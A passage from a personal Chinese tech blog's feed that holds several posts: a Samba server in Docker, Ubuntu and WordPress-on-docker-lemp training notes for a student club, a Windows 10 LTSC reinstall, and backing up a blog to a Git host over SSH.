      - &quot;139:139/tcp&quot;
      - &quot;445:445/tcp&quot;
    read_only: true
    tmpfs:
      - /tmp
    restart: unless-stopped
    stdin_open: true
    tty: true
    volumes:
      - ./data:/mnt:z

    command: &#39;-s &quot;Guoguo;/mnt;yes;no;no;guoguo&quot; -u &quot;guoguo;*******&quot;&#39;
      # 这里注意一下 第一个参数是分享名称，等会要用到，后面的 guoguo 就是用户名
      # -s 其他的参数分别如下，其他的都可以在 GitHub Wiki 上找到
      # -u 最简用法就是前面用户名，后面密码
      # &lt;share_name&gt;;
      # &lt;path_to_share&gt;;
      # [browsable] default:&#39;yes&#39; or &#39;no&#39;;
      # [read_only] default:&#39;yes&#39; or &#39;no&#39;;
      # [guest]: default: &#39;yes&#39; or &#39;no&#39;;
      # [users]: default: &#39;all&#39; or list of allowed users;
      # [admins] default: &#39;none&#39; or list of admin users;
      # [writelist] default: &#39;none&#39; or list of users that can write to read-only share;
      # [comment] default: &#39;none&#39; or description of share
networks:
  default:
</code></pre>
<p>这里需要注意一下，他这里 wiki 用的是环境变量，但他也说明了环境变量只能使用单个用户，多个用户是需要使用 command ，具体格式见上述 wiki ，当时我还盯着半天 Incorrect Example 想着为啥连不上（小声</p>
<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>执行</p>
<pre><code>sudo docker-compose up -d
</code></pre>
<h1 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h1><p><img data-src="/images/Article/Samba/Explorer.png" alt="/images/Article/Samba/Explorer.png"></p>
<p>Windows 中，此电脑右键，映射网络驱动器，在文件夹中填入 \<Server Address>&lt;share_name&gt;</p>
<p>例如上面我的 share_name 写的是 Guoguo，IP 为 192.168.6.233 那此处就写 \192.168.6.233\Guoguo，注意勾选使用其他凭据连接，完成，输入上面填入的账号密码，连接成功。再在其中新建文件夹，linux 上 ls，成功新建。</p>
<p>share_name 这里卡了我好久，次次都说无法找到网络路径次次排查，最后才发现得这么写（摔</p>
<h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><p>在路由器上，对 137、138 端口进行 UDP 转发，445、139端口进行 TCP 转发，使用校园内网 IP 进行访问测试</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>本来到这里就结束了的，没想到捣鼓完了以后，发现校园网把 445 屏蔽了，想要连接到服务器就只能走 VPN 连回宿舍再连接服务器，这显然不符合自己之前的目的，于是就只能想要另一种方法了。</p>
]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
      <tags>
        <tag>瞎搞</tag>
        <tag>File Share</tag>
        <tag>Samba</tag>
      </tags>
  </entry>
  <entry>
    <title>不 锈 钢 牌 讲 师 —— Ubuntu 的安装与基本命令</title>
    <url>/archives/Ubuntu-Installation.html</url>
    <content><![CDATA[<h1 id="课前注意"><a href="#课前注意" class="headerlink" title="课前注意"></a>课前注意</h1><p>由于第一次尝试干这种活，可能干的是烂活，讲的过程中有啥问题可以直接指出</p>
<p>本文为培训参考资料，讲 Linux 的基础操作和 WordPress 的安装，<del>如果路过博客的小伙伴觉得技术一般的话能不能轻点骂 QAQ</del></p>
<p>网安的成员可以独立完成的话可参考 <a href="https://guo.moe/archives/Docker-Swarm.html">https://guo.moe/archives/Docker-Swarm.html</a> 尝试自行完成其他任务。</p>
<p>开头讲的都是比较基础的内容，所以有基础的本来大概懂的学习了以后可以自己拓展一下，没有的跟着走就好了，请大家务必先把课前的内容提前安排好。</p>
<blockquote>
<p>善于使用搜索引擎</p>
</blockquote>
<p>如果是安装过程中出现问题，请先尝试将你的问题在搜索引擎上寻找答案，在没有自行搜索过答案的情况下直接提问可能只会获得 <a href="https://lmbtfy.cn/">https://lmbtfy.cn/</a> </p>
<span id="more"></span>

<h1 id="第一讲（复习巩固为主）"><a href="#第一讲（复习巩固为主）" class="headerlink" title="第一讲（复习巩固为主）"></a>第一讲（复习巩固为主）</h1><h2 id="Ubuntu-环境安装（课前）"><a href="#Ubuntu-环境安装（课前）" class="headerlink" title="Ubuntu 环境安装（课前）"></a>Ubuntu 环境安装（课前）</h2><p>有 VMware 的可以用 VMware，没有的自己下载或者用免费的 VirtualBox ，这边统一一下 Ubuntu 20.04 方便后续操作</p>
<p>VirtualBox 下载：<a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a></p>
<p>Ubuntu 20.04 镜像下载：<a href="https://ubuntu.com/download/server/thank-you?version=20.04&architecture=amd64">https://ubuntu.com/download/server/thank-you?version=20.04&amp;architecture=amd64</a></p>
<p>参考资料：</p>
<p>VMware: <a href="https://blog.csdn.net/github_38336924/article/details/82427252">https://zhuanlan.zhihu.com/p/38797088</a></p>
<p>Virtualbox: <a href="https://segmentfault.com/a/1190000022468063">https://zhuanlan.zhihu.com/p/35619204</a></p>
<p>按照教程一步步走，<del>节省时间你用简易安装也没所谓</del></p>
<p>目前已知的问题 1：自带的 ubuntu CN 镜像源十分缓慢，安装向导如果遇到 mirrors 字样的设置请将镜像源换为 <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu">https://mirrors.tuna.tsinghua.edu.cn/ubuntu</a></p>
<p>目前已知的问题 2: 安装过程不要使用简易安装，不然可能会出现卡在 installing open-vm-tools 的问题</p>
<p><img data-src="/images/Article/Ubuntu-Installation-WordPress//Untitled.png" alt="/images/Article/Ubuntu-Installation-WordPress//Untitled.png"></p>
<p>注意此处把 openssh server 勾上，忘记勾了也没关系</p>
<p>注意：登陆的时候 password 是没有显示的，不会显示星星之类的任何东西，按照你的感觉输完了以后直接回车就好了</p>
<h2 id="Ubuntu-基本命令使用"><a href="#Ubuntu-基本命令使用" class="headerlink" title="Ubuntu 基本命令使用"></a>Ubuntu 基本命令使用</h2><p>注：权限不足的情况下请在下列命令前写上 sudo[空格!] 再尝试，或者输入 sudo su 切换到 root 用户</p>
<h2 id="检查-wheel-用户组"><a href="#检查-wheel-用户组" class="headerlink" title="检查 wheel 用户组"></a>检查 wheel 用户组</h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">cat /etc/<span class="keyword">group</span> | grep wheel</span><br></pre></td></tr></table></figure>

<p>如果没有返回则没有 wheel 用户组</p>
<h2 id="创建-wheel-用户组"><a href="#创建-wheel-用户组" class="headerlink" title="创建 wheel 用户组"></a>创建 wheel 用户组</h2><p>如果上一步没有 wheel 用户组，则创建一个用户组</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">addgroup wheel</span><br></pre></td></tr></table></figure>

<h2 id="新增用户"><a href="#新增用户" class="headerlink" title="新增用户"></a>新增用户</h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">useradd superuser</span><br></pre></td></tr></table></figure>

<h2 id="更改密码"><a href="#更改密码" class="headerlink" title="更改密码"></a>更改密码</h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">passwd supersu</span><br></pre></td></tr></table></figure>

<h2 id="切换默认编辑器"><a href="#切换默认编辑器" class="headerlink" title="切换默认编辑器"></a>切换默认编辑器</h2><p>linux 下常用的编辑器有 nano、vim、vi 等，可按照自己的需要替换默认编辑器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> EDITOR=<span class="string">&#x27;/usr/bin/vim&#x27;</span>  <span class="comment"># vim 可替换为较为简单的编辑器 nano</span></span><br><span class="line"><span class="comment"># 如：export EDITOR=&#x27;/usr/bin/nano&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="将-wheel-用户组添加到-sudoer-中"><a href="#将-wheel-用户组添加到-sudoer-中" class="headerlink" title="将 wheel 用户组添加到 sudoer 中"></a>将 wheel 用户组添加到 sudoer 中</h2><p>输入 sudo visudo</p>
<p>在 %admin ALL=(ALL) ALL 下方添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%wheel ALL=(ALL) ALL</span><br></pre></td></tr></table></figure>

<p>如果你不慎进入 vim 编辑器不会退出的话（确信），请点击左上方的 esc 键并依次输入 :q! 后按 enter 退出，并重新进行上述的操作切换为 nano</p>
<h2 id="切入-superuser-用户中"><a href="#切入-superuser-用户中" class="headerlink" title="切入 superuser 用户中"></a>切入 superuser 用户中</h2><p>输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su superuser</span><br></pre></td></tr></table></figure>

<p>并输入密码即可切换到 superuser 用户</p>
<h2 id="尝试使用-sudo-指令"><a href="#尝试使用-sudo-指令" class="headerlink" title="尝试使用 sudo 指令"></a>尝试使用 sudo 指令</h2><p>尝试在 superuser 中使用 sudo 指令，如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update -y</span><br></pre></td></tr></table></figure>

<p>看看是否有权限进行</p>
<h2 id="查看虚拟机的-ip-地址"><a href="#查看虚拟机的-ip-地址" class="headerlink" title="查看虚拟机的 ip 地址"></a>查看虚拟机的 ip 地址</h2><p>输入 ip addr，看除了开头为 lo 的另一个网卡（VMware Fusion 一般为 ens33）的 ip 地址</p>
<p><img data-src="/images/Article/Ubuntu-Installation-WordPress//Untitled%201.png" alt="/images/Article/Ubuntu-Installation-WordPress//Untitled%201.png"></p>
<h2 id="安装-openssh"><a href="#安装-openssh" class="headerlink" title="安装 openssh"></a>安装 openssh</h2><p>可能部分同学忘记在上方勾选安装 openssh server ，在这里安装一下就行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install openssh -y</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> sshd</span><br><span class="line">sudo systemctl start sshd</span><br></pre></td></tr></table></figure>

<h2 id="尝试在实体机上连接虚拟机-ssh"><a href="#尝试在实体机上连接虚拟机-ssh" class="headerlink" title="尝试在实体机上连接虚拟机 ssh"></a>尝试在实体机上连接虚拟机 ssh</h2><p>打开 powershell 窗口</p>
<p>输入 ssh <a href="mailto:&#115;&#117;&#112;&#101;&#114;&#117;&#115;&#101;&#x72;&#64;&#x31;&#55;&#x32;&#46;&#x31;&#x36;&#x2e;&#x32;&#x31;&#x36;&#x2e;&#x31;&#51;&#x39;">&#115;&#117;&#112;&#101;&#114;&#117;&#115;&#101;&#x72;&#64;&#x31;&#55;&#x32;&#46;&#x31;&#x36;&#x2e;&#x32;&#x31;&#x36;&#x2e;&#x31;&#51;&#x39;</a> 并输入刚才设置的密码连接到虚拟机的 ssh</p>
<h2 id="创建用户目录设置权限并更改默认-shell"><a href="#创建用户目录设置权限并更改默认-shell" class="headerlink" title="创建用户目录设置权限并更改默认 shell"></a>创建用户目录设置权限并更改默认 shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkdir /home/superuser</span><br><span class="line">sudo chown -R superuser /home/superuser</span><br><span class="line">chsh -s /bin/bash</span><br></pre></td></tr></table></figure>

<p>输入 exit 并重新登陆</p>
<h2 id="更换-apt-源"><a href="#更换-apt-源" class="headerlink" title="更换 apt 源"></a>更换 apt 源</h2><p>参考：<a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先对 sources.list 进行备份</span></span><br><span class="line">sudo mv /etc/apt/sources.list ~</span><br><span class="line"><span class="comment"># 再用自己喜欢的编辑器编辑 /etc/apt/sources.list</span></span><br><span class="line"><span class="comment"># 将上方链接中的内容复制到 ssh 中，粘贴快捷键为 shift+insert (macOS 用户: ⌘+V)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预发布软件源，不建议启用</span></span><br><span class="line"><span class="comment"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span></span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span></span><br></pre></td></tr></table></figure>

<h2 id="安装并使用-screen"><a href="#安装并使用-screen" class="headerlink" title="安装并使用 screen"></a>安装并使用 screen</h2><p>当你需要离开 ssh 但又要保持一些程序在后台，你就需要 screen</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install screen -y</span><br></pre></td></tr></table></figure>

<p> 输入 screen -S example 创建一个名为 example 的 screen</p>
<p>在里面执行一个长时间运行的程序，如 ping 127.0.0.1</p>
<p>按住 ctrl，依次按下 A 和 D 暂时退出 screen</p>
<p>输入 screen -r example 恢复，ctrl+C 停止程序，输入 exit 关闭 screen</p>
<h2 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h2><p>比如说查看 /etc/group 的内容，就在前面加一只猫</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/group</span><br></pre></td></tr></table></figure>

<h2 id="grep-的使用"><a href="#grep-的使用" class="headerlink" title="grep 的使用"></a>grep 的使用</h2><p>当你需要在输出中快速筛选出拥有关键词所在的行，就可以使用这个</p>
<p>试一试筛选出你刚才添加的 wheel 组</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/group</span><br><span class="line">cat /etc/group | grep wheel</span><br></pre></td></tr></table></figure>

<h2 id="使用-gt-将输出写入文件之中"><a href="#使用-gt-将输出写入文件之中" class="headerlink" title="使用 &gt; 将输出写入文件之中"></a>使用 &gt; 将输出写入文件之中</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> lambda &gt; hello.txt</span><br><span class="line">cat hello.txt</span><br></pre></td></tr></table></figure>

<h2 id="sed-的使用"><a href="#sed-的使用" class="headerlink" title="sed 的使用"></a>sed 的使用</h2><h3 id="对于输出的直接操作"><a href="#对于输出的直接操作" class="headerlink" title="对于输出的直接操作"></a>对于输出的直接操作</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;awei: kksk&#x27;</span> | sed <span class="string">&#x27;s/kksk/awsl/g&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="对于文件的直接操作"><a href="#对于文件的直接操作" class="headerlink" title="对于文件的直接操作"></a>对于文件的直接操作</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/da/dadadadadada/g&#x27;</span> hello.txt</span><br><span class="line">cat hello.txt</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
      <tags>
        <tag>工作室</tag>
        <tag>培训</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 10 LTSC 初体验</title>
    <url>/archives/Windows-10-LTSC-2019.html</url>
    <content><![CDATA[<p>在升级到 Windows 10 1909 以后，XPS 的续航从开着省电模式5个小时骤降至两个半小时，比人家游戏本还差，正好也苦于 Windows 10 的更新体验，再加上总是出一些莫名其妙的bug（比如说双屏情况下鼠标和键盘总是会突然卡一下，和手环、手机经常连不上）于是就干脆换成 Windows LTSC 2019 试试。</p>
<span id="more"></span>

<p>在 msdn Itellyou 下载好 LTSC 的镜像以后，就开始了重装之旅。从 Windows 10 1909 专业工作站版直接安装不能够保留个人文件，于是把重要文件都移到了 NUC 上备份，开始重装。</p>
<p>安装中途和普通安装差别不大，就是在安装过程中登录 Microsoft 账号需要使用学校或工作账号，不过在安装完毕后可以使用个人账号重新登陆，安装时先创建个人账号即可。</p>
<p>安装后系统很干净，没有 Windows Store ，没有 Cortana， 没有 Mail</p>
<p>这里的不保留任何个人文件，说是不保留，其实和U盘直接安装差不多，Program Files， Windows等文件夹删掉或移到 Windows.old 文件夹，Users 文件夹移到 Windows.old 文件夹，其他文件夹保留在原位置。</p>
<h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><h3 id="Windows-Store"><a href="#Windows-Store" class="headerlink" title="Windows Store"></a>Windows Store</h3><p>作为 Windows 10 的铁哥，这玩意怎么能没有呢</p>
<blockquote>
<p>参照此处 <a href="https://github.com/kkkgo/LTSC-Add-MicrosoftStore#%E4%B8%BAwindows-10-enterprise-ltsc%E5%A2%9E%E5%8A%A0%E5%BA%94%E7%94%A8%E5%95%86%E5%BA%97">为Windows 10 Enterprise LTSC增加应用商店</a></p>
</blockquote>
<p>安装完成后正常使用软件</p>
<h3 id="Windows-Mail"><a href="#Windows-Mail" class="headerlink" title="Windows Mail"></a>Windows Mail</h3><pre><code class="Emmc">
![/images/Article/Windows10LTSC/mail.png](/images/Article/Windows10LTSC/mail.png)

[点击此处跳转下载](https://www.microsoft.com/en-us/p/mail-and-calendar/9wzdncrfhvqm?activetab=pivot:overviewtab)

### Office

SBM$ ，我的 MS 账号有 Office 365 的家庭版授权，但是一直无法激活 office 365，一激活就报没有 Office 365 的许可证，然后自动给我换成 Office 2019，而且 OneDrive 也一直只有5G，多次给 M$ 致电仍然不了了之，有几次打过去甚至直接把我电话挂了？？我TM

![/images/Article/Windows10LTSC/MS.png](/images/Article/Windows10LTSC/MS.png)

当场给他多打了几次，次次都说催工程师，结果到现在都还没给我回电。

重装以后系统终于恢复之前的续航了，可喜可贺

晒一张重装后的系统属性界面图

![/images/Article/Windows10LTSC/Prop.png](/images/Article/Windows10LTSC/Prop.png)

emmc 之前听说 XPS 续航挺好的来着，不知道为啥有点低于预期（小声逼逼
</code></pre>
]]></content>
      <categories>
        <category>无聊吐吐槽</category>
      </categories>
      <tags>
        <tag>Windows 10</tag>
      </tags>
  </entry>
  <entry>
    <title>不 锈 钢 牌 讲 师 —— WordPress 在 docker-lemp 上的安装</title>
    <url>/archives/WordPress-Installation.html</url>
    <content><![CDATA[<h1 id="第二讲"><a href="#第二讲" class="headerlink" title="第二讲"></a>第二讲</h1><p>为了照顾各个同学的网络，所以听讲的同学们请至少提前一天完成以下操作，节省时间就能提早讲完。</p>
<span id="more"></span>

<h2 id="提前-下载-WordPress-压缩包"><a href="#提前-下载-WordPress-压缩包" class="headerlink" title="(提前) 下载 WordPress 压缩包"></a>(提前) 下载 WordPress 压缩包</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span></span><br><span class="line">wget https://wordpress.org/latest.zip</span><br></pre></td></tr></table></figure>

<h2 id="提前-安装-docker-等必要套件"><a href="#提前-安装-docker-等必要套件" class="headerlink" title="(提前) 安装 docker 等必要套件"></a>(提前) 安装 docker 等必要套件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install -y unzip git docker.io docker-compose</span><br></pre></td></tr></table></figure>

<h2 id="提前-更换-Docker-镜像源"><a href="#提前-更换-Docker-镜像源" class="headerlink" title="(提前) 更换 Docker 镜像源"></a>(提前) 更换 Docker 镜像源</h2><p>参考资料：<a href="https://blog.csdn.net/whatday/article/details/86770609">https://blog.csdn.net/whatday/article/details/86770609</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"><span class="comment"># 修改为以下内容</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;http://hub-mirror.c.163.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<h2 id="提前-拉取-Docker-镜像"><a href="#提前-拉取-Docker-镜像" class="headerlink" title="(提前) 拉取 Docker 镜像"></a>(提前) 拉取 Docker 镜像</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker pull metowolf/php:7.4.6</span><br><span class="line">sudo docker pull mysql/mysql-server:8.0.20</span><br><span class="line">sudo docker pull phpmyadmin/phpmyadmin:5.0.2</span><br><span class="line">sudo docker pull metowolf/nginx:1.17.10</span><br><span class="line">sudo docker pull redis:6.0.2-alpine</span><br></pre></td></tr></table></figure>

<h2 id="metowolf-docker-lemp-部署"><a href="#metowolf-docker-lemp-部署" class="headerlink" title="metowolf/docker-lemp 部署"></a>metowolf/docker-lemp 部署</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/metowolf/docker-lemp.git</span><br><span class="line"><span class="built_in">cd</span> docker-lemp</span><br><span class="line">cp .env.example .env</span><br><span class="line">cp docker-compose.example.yml docker-compose.yml</span><br><span class="line"><span class="comment"># 修改 .env</span></span><br><span class="line">vim .env</span><br><span class="line"><span class="comment"># 将 MYSQL_ROOT_PASSWORD=root 中的 root 改成你想要的密码</span></span><br><span class="line"><span class="comment"># 或者尝试 sed -i &#x27;s/root/密码/g&#x27; .env</span></span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>

<h2 id="访问网站"><a href="#访问网站" class="headerlink" title="访问网站"></a>访问网站</h2><p>在浏览器中打开上面的 IP，浏览器正常输出 phpinfo();</p>
<h2 id="WordPress-部署"><a href="#WordPress-部署" class="headerlink" title="WordPress 部署"></a>WordPress 部署</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> wwwroot/default</span><br><span class="line">rm -f index.php</span><br><span class="line">mv ~/latest.zip .</span><br><span class="line">unzip latest.zip</span><br><span class="line">mv wordpress/* .</span><br><span class="line">rm -rf wordpress/</span><br></pre></td></tr></table></figure>

<h3 id="在-phpmyadmin-创建新数据库"><a href="#在-phpmyadmin-创建新数据库" class="headerlink" title="在 phpmyadmin 创建新数据库"></a>在 phpmyadmin 创建新数据库</h3><p>浏览器登入 ip:8080 ，输入账号 root 和刚设的密码，点击数据库，输入数据库名，创建数据库</p>
<p><img data-src="/images/Article/Ubuntu-Installation-WordPress//Untitled%202.png" alt="/images/Article/Ubuntu-Installation-WordPress//Untitled%202.png"></p>
<p>这边为了节省时间就暂时不分离账户了，有兴趣的小伙伴也可以自行搜索方法或者直接创建账户分权。</p>
<h3 id="WordPress-向导数据库填写"><a href="#WordPress-向导数据库填写" class="headerlink" title="WordPress 向导数据库填写"></a>WordPress 向导数据库填写</h3><p><img data-src="/images/Article/Ubuntu-Installation-WordPress//Untitled%203.png" alt="/images/Article/Ubuntu-Installation-WordPress//Untitled%203.png"></p>
<p>注意向导这里，数据库填写刚才创建的数据库，密码填写刚才修改的密码，主机填写 mysql</p>
<p>然后可能会遇到</p>
<p><img data-src="/images/Article/Ubuntu-Installation-WordPress//Untitled%204.png" alt="/images/Article/Ubuntu-Installation-WordPress//Untitled%204.png"></p>
<p>输入 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/docker-lemp/wwwroot/default/wp-config.php</span><br></pre></td></tr></table></figure>

<p>将上面的内容复制到其中，保存</p>
<p>站点信息自己设置一下，就可以完成了</p>
<h1 id="废弃方案"><a href="#废弃方案" class="headerlink" title="废弃方案"></a>废弃方案</h1><p>这边堆放复杂的废弃方案</p>
<h2 id="废弃-安装-docker"><a href="#废弃-安装-docker" class="headerlink" title="(废弃) 安装 docker"></a>(废弃) 安装 docker</h2><p>参考资料：<a href="https://docs.docker.com/engine/install/ubuntu/">https://docs.docker.com/engine/install/ubuntu/</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install \</span><br><span class="line">  apt-transport-https \</span><br><span class="line">  ca-certificates \</span><br><span class="line">  curl \</span><br><span class="line">  gnupg-agent \</span><br><span class="line">  software-properties-common</span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">sudo add-apt-repository \</span><br><span class="line"> <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string"> <span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string"> stable&quot;</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>

<h2 id="废弃-安装-docker-compose"><a href="#废弃-安装-docker-compose" class="headerlink" title="(废弃) 安装 docker-compose"></a>(废弃) 安装 docker-compose</h2><p>参考资料：<a href="https://docs.docker.com/compose/install/">https://docs.docker.com/compose/install/</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.26.2/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
      <tags>
        <tag>工作室</tag>
        <tag>培训</tag>
      </tags>
  </entry>
  <entry>
    <title>【闷声备大份】巧用 Coding 等 Git 备份 Blog</title>
    <url>/archives/backup-blog.html</url>
    <content><![CDATA[<p>好久没写blog了，随便写一点。翻别人的blog，都是一些很高端的玩意儿</p>
<p>其实我在想这个标题的时候犹豫了很久，因为<br><img data-src="/images/Date/2017/06/3742618090.png" alt="1.png" title="1.png"></p>
<p>想想好像是，于是<br><img data-src="/images/Date/2017/06/76649884.png" alt="2.png" title="2.png"></p>
<p>如果文章有错误疏漏之处，欢迎指正。</p>
<span id="more"></span>

<hr>
<p>江来出了啥差错，我可是付不起泽任的，识得唔识得！</p>
<p>好不容易堆出一堆没啥用的东西。</p>
<p><em>这个教程仅面向于有服务器SSH，Git权限的玩家</em></p>
<p>其实这玩意儿没啥技术含量（</p>
<blockquote>
<p>前戏</p>
</blockquote>
<p>首先你需要一个 <a href="/images/Date/2017/06/4053070943.png">Coding</a> 或其他 Git 账号，<a href="http://lmgtfy.com/?q=%E5%A6%82%E4%BD%95%E6%B3%A8%E5%86%8C+Coding">如何注册？</a></p>
<p>然后你得创建一个新项目。</p>
<p><img data-src="/images/Date/2017/06/4053070943.png" alt="create.png" title="create.png"></p>
<p><img data-src="/images/Date/2017/06/528087134.png" alt="create2.png" title="create2.png"></p>
<p>库注意选择私有，项目名称有名称格式要求。</p>
<blockquote>
<p>配置</p>
</blockquote>
<p>你大可在服务器上直接跑 ssh &amp; git ，有则会返回类似这样的东西</p>
<pre><code>➜  ~ ssh
usage: ssh [-1246AaCfGgKkMNnqsTtVvXxYy] [-b bind_address] [-c cipher_spec]
           [-D [bind_address:]port] [-E log_file] [-e escape_char]
           [-F configfile] [-I pkcs11] [-i identity_file]
           [-J [user@]host[:port]] [-L address] [-l login_name] [-m mac_spec]
           [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address]
           [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]]
           [user@]hostname [command]
➜  ~ git
usage: git [--version] [--help] [-C ] [-c name=value]
           [--exec-path[=]] [--html-path] [--man-path] [--info-path]
           [-p | --paginate | --no-pager] [--no-replace-objects] [--bare]
           [--git-dir=] [--work-tree=] [--namespace=]
            []
</code></pre>
<p>如果 ssh: command not found / git: command not found<br>你就选择原谅他/她。<br>如果你用 Redhat Linux，执行：sudo yum install openssh / sudo yum install git<br>如果你用 Ubuntu Linux，执行：sudo apt-get install openssh / sudo apt-get install git<br>如果你用 Arch Linux，执行：sudo pacman -S openssh / sudo pacman -S git<br>并且 y 。</p>
<p>然后你大可输入 ssh-keygen -t rsa，大概会出现下面的东西，连续enter三次就好了）</p>
<pre><code>➜  ~ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Created directory &#39;/root/.ssh&#39;.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
**:**:**:**:**:**:**:**:**:**:**:**:**:**:**:** 
The key&#39;s randomart image is:
+--[ RSA 2048]----+
| .....o.B+.      |
|..o ...=.o .     |
| .Eo . o. o      |
|    .  ..+ o     |
|      o S * .    |
|       o . .     |
|                 |
|                 |
|                 |
+-----------------+
➜  ~ 
</code></pre>
<p>然后 ~/.ssh/ 就会出现 id_rsa 和 id_rsa.pub 俩玩意儿。</p>
<p>回到coding，点击设置，部署公钥，新建公钥</p>
<p><img data-src="/images/Date/2017/06/3106651766.png" alt="key.png" title="key.png"></p>
<p>输入 cat ~/.ssh/id_rsa.pub ，把得到的东西粘贴到这，注意授予推送权限。</p>
<p><img data-src="/images/Date/2017/06/2402396997.png" alt="1" title="1"></p>
<p>确定以后可以看到这玩意儿。</p>
<p><img data-src="/images/Date/2017/06/1819699400.png" alt="key2.png" title="key2.png"></p>
